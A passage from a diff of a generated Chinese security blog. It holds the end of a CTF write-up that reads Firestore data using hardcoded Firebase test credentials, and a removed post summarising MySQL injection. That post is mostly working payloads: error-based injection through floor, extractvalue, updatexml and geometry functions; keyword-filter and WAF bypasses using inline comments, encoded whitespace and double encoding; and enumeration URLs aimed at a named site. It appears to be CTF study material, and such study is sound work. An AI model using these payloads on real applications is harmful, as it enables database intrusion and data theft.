class="string">&quot;cookies&quot;</span>).get().then(<span class="function">(<span class="params">querySnapshot</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        querySnapshot.forEach(<span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(doc.data());</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Insert these scripts at the bottom of the HTML, but before you use any Firebase services --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Firebase App (the core Firebase SDK) is always required and must be listed first --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- If you enabled Analytics in your project, add the Firebase SDK for Analytics --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-analytics.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Add Firebase products that you want to use --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-auth.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-firestore.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> firebaseConf = &#123;</span></span><br><span class="line"><span class="javascript">        apiKey: <span class="string">&quot;AIzaSyDOCn4NThEqv9Y-afv36PfJWBUYiGm1rkI&quot;</span>,</span></span><br><span class="line"><span class="javascript">        authDomain: <span class="string">&quot;cookie-clicker1.firebaseapp.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        databaseURL: <span class="string">&quot;https://cookie-clicker1.firebaseio.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        projectId: <span class="string">&quot;cookie-clicker1&quot;</span>,</span></span><br><span class="line"><span class="javascript">        storageBucket: <span class="string">&quot;cookie-clicker1.appspot.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        messagingSenderId: <span class="string">&quot;186649534277&quot;</span>,</span></span><br><span class="line"><span class="javascript">        appId: <span class="string">&quot;1:186649534277:web:a75d541debbd366cebe82c&quot;</span>,</span></span><br><span class="line"><span class="javascript">        measurementId: <span class="string">&quot;G-7LWV67HSXP&quot;</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    firebase.initializeApp(firebaseConf);</span><br><span class="line"><span class="javascript">    firebase.auth().signInWithEmailAndPassword(<span class="string">&quot;tiaonmm@test.com&quot;</span>, <span class="string">&quot;tiaonmmn&quot;</span>).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// Handle Errors here.</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errorCode = error.code;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errorMessage = error.message;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// ...</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> db=firebase.firestore();</span></span><br><span class="line"><span class="javascript">    db.collection(<span class="string">&quot;users&quot;</span>).get().then(<span class="function">(<span class="params">querySnapshot</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        querySnapshot.forEach(<span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;doc.id&#125;</span> =&gt; <span class="subst">$&#123;doc.data()&#125;</span>`</span>);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="javascript">    db.collection(<span class="string">&quot;cookies&quot;</span>).get().then(<span class="function">(<span class="params">querySnapshot</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        querySnapshot.forEach(<span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(doc.data());</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>浏览器访问后打开控制台即可看到flag。</p>
 
-    <div id="aplayer-yNnJYqYg" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-OMhpkDfK" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="32317208" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
     ></div>
 <p>flag{6f4bfe3a-9a40-4cf2-869e-3edd8f9e40d4}</p>
@@ -1322,212 +1447,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/08/24/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpeg">
-      <meta itemprop="name" content="Tiaonmmn.ZMZ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tiaonmmn's Littile House">
-    </span>
-
-    
-    
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/24/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">MySQL注入总结</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-08-24 15:58:59" itemprop="dateCreated datePublished" datetime="2020-08-24T15:58:59+08:00">2020-08-24</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-09-09 17:07:16" itemprop="dateModified" datetime="2020-09-09T17:07:16+08:00">2020-09-09</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
-        </span>
-    </span>
-
-  
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/08/24/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/08/24/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>5.8k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>5 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="or-and被过滤">or and被过滤</h1>
-<p>用|| &amp;&amp;代替</p>
-<h1 id="union-select-被过滤">union select 被过滤</h1>
-<p>用/*!union*/ /*!select*/代替</p>
-<h1 id="空格被过滤">空格被过滤</h1>
-<p>用/%0a/，或者()。</p>
-<h1 id="逗号被过滤">逗号被过滤</h1>
-<p>if换成select case when，substring改用substring( from 1 for 1)</p>
-<h1 id="报错注入">报错注入</h1>
-<p>1.floor()</p>
-<p>select * from test where id=1 and (select 1 from (select count(<em>),concat(user(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p>
-<figure>
-<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928204840594-1429421338.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>2.extractvalue()</p>
-<p>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>
-<figure>
-<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205421297-407989251.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>3.updatexml()</p>
-<p>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>
-<figure>
-<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205451969-1920882857.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>4.geometrycollection()</p>
-<p>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</p>
-<figure>
-<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205719485-521701933.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>5.multipoint()</p>
-<p>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</p>
-<figure>
-<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205942266-563740245.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>6.polygon()</p>
-<p>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</p>
-<figure>
-<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205828281-760176387.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>7.multipolygon()</p>
-<p>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</p>
-<figure>
-<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210038094-1420034123.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>8.linestring()</p>
-<p>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</p>
-<figure>
-<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210144438-1099086559.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>9.multilinestring()</p>
-<p>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</p>
-<figure>
-<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210420750-344279412.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>10.exp()</p>
-<p>select * from test where id=1 and exp(~(select * from(select user())a));</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or)&#x2F;i&#39;,$id);</span><br><span class="line">Bypass: 1||1    1&amp;&amp;1</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;, $id);</span><br><span class="line">Payload: union select user, password from users</span><br><span class="line">Bypass:  1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">Bypass:  1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line">Bypass:  1 || (select user from users group by user_id having user_id&#x3D;1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || (select user from users group by user_id having user_id&#x3D;1) &#x3D; &#39;admin&#39;</span><br><span class="line">Bypass:  1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">Bypass:  1 || 1&#x3D;1 into outfile &#39;result.txt&#39;</span><br><span class="line">Bypass:  1 || substr(user,1,1)&#x3D;&#39;a&#39;</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">Bypass:  1 || user_id is not null</span><br><span class="line">Bypass:  1 || substr(user,1,1) &#x3D; 0x61</span><br><span class="line">Bypass:  1 || substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line">Bypass:  1 || substr(user,1,1) &#x3D; lower(conv(10,10,36))</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || substr(user,1,1) &#x3D; lower(conv(11,10,36))</span><br><span class="line">Bypass:  1 || lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr|\s)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || lpad(user, 7, 1)</span><br><span class="line">Bypass:  1%0b||%0blpad(user,7,1)</span><br><span class="line"></span><br><span class="line">Bypass with comments</span><br><span class="line">id&#x3D;1+un&#x2F;**&#x2F;ion+se&#x2F;**&#x2F;lect+1,2,3-- </span><br><span class="line"></span><br><span class="line">Bypass Regex Filter: &#x2F;union\sselect&#x2F;g</span><br><span class="line">1+UnIon&#x2F;**&#x2F;SeLecT&#x2F;**&#x2F;1,2,3-- </span><br><span class="line"></span><br><span class="line">Bypass preg_replace</span><br><span class="line">1+UNunionION+SEselectLECT+1,2,3--</span><br><span class="line"></span><br><span class="line">If WAF use preg_replace to replace SQL keywords to whitespace</span><br><span class="line">1+uni%0bon+se%0blect+1,2,3--</span><br><span class="line"></span><br><span class="line">For Mod_rewrite, &#x2F;**&#x2F; cannot bypassed. So we use %0b replace &#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">Double encode can bypass some waf</span><br><span class="line">1%252f%252a*&#x2F;union%252f%252a &#x2F;select%252f%252a*&#x2F;1,2,3%252f%252a*&#x2F;from%252f%252a*&#x2F;users--</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line">id&#x3D;0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user</span><br><span class="line">%0D%0A as a newline</span><br><span class="line">&#x3D;&#x3D;&gt;</span><br><span class="line">0 div 1 union#foo&#x2F;**&#x2F;bar</span><br><span class="line">select#foo</span><br><span class="line">1,2,current</span><br><span class="line"></span><br><span class="line">Inline Comments</span><br><span class="line">id&#x3D;1&#x2F;*!uNIon*&#x2F;SeLeCt+1,2,3-- </span><br><span class="line">id&#x3D;&#x2F;*!UnIoN*&#x2F;+&#x2F;*!SeLecT*&#x2F;+1,2,concat(&#x2F;*!table_name*&#x2F;)+FrOm&#x2F;*!information_schema*&#x2F;.tables&#x2F;*!WhErE*&#x2F;+&#x2F;*!TaBlE_sChEMa*&#x2F;+like+database()--</span><br><span class="line">id&#x3D;1&#x2F;*!50000union*&#x2F;&#x2F;*!50000select*&#x2F;</span><br></pre></td></tr></table></figure>
-<h1 id="时间盲注">时间盲注</h1>
-<p>sleep benchmark</p>
-<h1 id="waf">WAF</h1>
-<h2 id="section">01</h2>
-$filter = "/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";`
-<p>利用position/locate函数。 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">position</span>(<span class="keyword">hex</span>(<span class="string">&#x27;%s&#x27;</span>)<span class="keyword">in</span>(<span class="keyword">hex</span>(passwd)))=<span class="number">1</span>)^<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">position</span>(<span class="keyword">hex</span>(<span class="string">&#x27;S&#x27;</span>)<span class="keyword">in</span>(<span class="keyword">hex</span>(passwd)))=<span class="number">1</span>)^<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">position</span>(<span class="keyword">hex</span>(<span class="string">&#x27;SY&#x27;</span>)<span class="keyword">in</span>(<span class="keyword">hex</span>(passwd)))=<span class="number">1</span>)^<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">position</span>(<span class="keyword">hex</span>(<span class="string">&#x27;SYN&#x27;</span>)<span class="keyword">in</span>(<span class="keyword">hex</span>(passwd)))=<span class="number">1</span>)^<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">hex</span>(<span class="keyword">mid</span>((passwd)<span class="keyword">from</span>(-%d)))=<span class="keyword">hex</span>(<span class="string">&#x27;%s&#x27;</span>))^<span class="string">&#x27;</span></span><br><span class="line"><span class="string">select flag from flag where flag=&#x27;</span><span class="keyword">admin</span><span class="string">&#x27;&lt;(hex(mid((passwd)from(-1)))=hex(&#x27;</span>S<span class="string">&#x27;))^&#x27;</span></span><br><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">hex</span>(<span class="keyword">mid</span>((passwd)<span class="keyword">from</span>(<span class="number">-2</span>)))=<span class="keyword">hex</span>(<span class="string">&#x27;Y&#x27;</span>))^<span class="string">&#x27;</span></span><br><span class="line"><span class="string">select flag from flag where flag=&#x27;</span><span class="keyword">admin</span><span class="string">&#x27;&lt;(hex(mid((passwd)from(-3)))=hex(&#x27;</span>N<span class="string">&#x27;))^&#x27;</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="section-1">02</h2>
-$filter = "/<.*=(&#\\d+?;?)+?>|<.*data=data:text\\/html.*>|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|\\b(group_)?concat[\\s\\/\\*]*?\\([^\\)]+?\\)|\bcase[\s\/\*]*?when[\s\/\*]*?\([^\)]+?\)|load_file\s*?\\()|<[^>]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|>|<|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.*\\*\\/|<\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?|(`|'|\").*?(`|'|\"))FROM(\\(.+\\)|\\s+?.+?|(`|'|\").*?(`|'|\"))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)/i";
-<p>UNION正则没有\s，可以用%0a %a0 %0b %0c %0d 绕过UNION， select 后面可以接<code>+(%2b) - ! ~ @ &#123;&#125;</code> select{s`passwd`}from user 1 select~passwd from user </p>
-<h2 id="section-2">03</h2>
-$filter = "/[^\\{\\s]{1}(\\s|\\b)+(?:select\\b|update\\b|insert(?:(\\/\\*.*?\\*\\/)|(\\s)|(\\+))+into\\b).+?(?:from\\b|set\\b)|[^\\{\\s]{1}(\\s|\\b)+(?:create|delete|drop|truncate|rename|desc)(?:(\\/\\*.*?\\*\\/)|(\\s)|(\\+))+(?:table\\b|from\\b|database\\b)|into(?:(\\/\\*.*?\\*\\/)|\\s|\\+)+(?:dump|out)file\\b|\\bsleep\\([\\s]*[\\d]+[\\s]*\\)|benchmark\\(([^\\,]*)\\,([^\\,]*)\\)|(?:declare|set|select)\\b.*@|union\\b.*(?:select|all)\\b|(?:select|update|insert|create|delete|drop|grant|truncate|rename|exec|desc|from|table|database|set|where)\\b.*(charset|ascii|bin|char|uncompress|concat|concat_ws|conv|export_set|hex|instr|left|load_file|locate|mid|sub|substring|oct|reverse|right|unhex)\\(|(?:master\\.\\.sysdatabases|msysaccessobjects|msysqueries|sysmodules|mysql\\.db|sys\\.database_name|information_schema\\.|sysobjects|sp_makewebtask|xp_cmdshell|sp_oamethod|sp_addextendedproc|sp_oacreate|xp_regread|sys\\.dbms_export_extension)/i";
-
-<p>\b指单词边界，用内联注释/<em>!50000union</em>/绕过 %0aunion%0aselect%0a1,2,3,4%23</p>
-<h2 id="不能使用information_schema时">04 不能使用information_schema时</h2>
-
-$filter = "/union|and|\bor\b|information_schema|updatexml/i";
-
-<p>首先报错注入爆表名 admin'||linestring(id)%23 admin'||polygon(id)%23 然后爆列名 admin'||(select * from(select * from waf04 as a join waf04 as b c)%23 得到第一个列名，然后填到using里： admin'||(select * from(select * from waf04 as a join waf04 as b using(id))c)%23 admin' || (select * from(select * from waf04 as a join waf04 as b using(id,password))c)%23 or被过滤，用in admin' in (select * from(select * from waf04 as a join waf04 as b using(id,password))c)%23</p>
-<h1 id="floor等报错注入">floor等报错注入</h1>
-<p>1、通过floor暴错</p>
-<p>/<em>数据库版本</em>/</p>
-<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>连接用户</em>/</p>
-<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>连接数据库</em>/</p>
-<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴库</em>/</p>
-<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴表</em>/</p>
-<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴字段</em>/</p>
